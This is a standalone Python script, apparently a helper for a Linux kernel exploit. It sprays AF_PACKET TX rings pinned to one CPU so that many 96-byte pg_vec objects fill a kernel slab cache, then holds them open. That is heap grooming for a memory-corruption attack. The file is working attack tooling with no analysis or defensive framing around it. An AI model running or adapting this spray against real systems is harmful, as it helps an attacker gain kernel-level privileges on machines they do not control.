#!/usr/bin/env python3
"""ringspray.py <cpu> <count> - hold AF_PACKET TX rings (96-byte pg_vec)."""
import socket, struct, mmap, os, sys, time
cpu=int(sys.argv[1]); n=int(sys.argv[2])
os.sched_setaffinity(0,{cpu})
ETH_P_ALL=3; SOL_PACKET=263; PACKET_VERSION=10; PACKET_TX_RING=13; TPACKET_V1=0
keep=[]
block_size=4096; block_nr=12; frame_size=2048; frame_nr=24
req=struct.pack("IIII",block_size,block_nr,frame_size,frame_nr)
for i in range(n):
    s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    s.bind(("lo",0))
    s.setsockopt(SOL_PACKET, PACKET_VERSION, TPACKET_V1)
    s.setsockopt(SOL_PACKET, PACKET_TX_RING, req)
    m=mmap.mmap(s.fileno(), block_size*block_nr, mmap.MAP_SHARED, mmap.PROT_READ|mmap.PROT_WRITE)
    m[0:16]=b'P'*16
    keep.append((s,m))
print("rings",len(keep),"pg_vec_bytes",len(keep)*block_nr*8, flush=True)
time.sleep(3600)
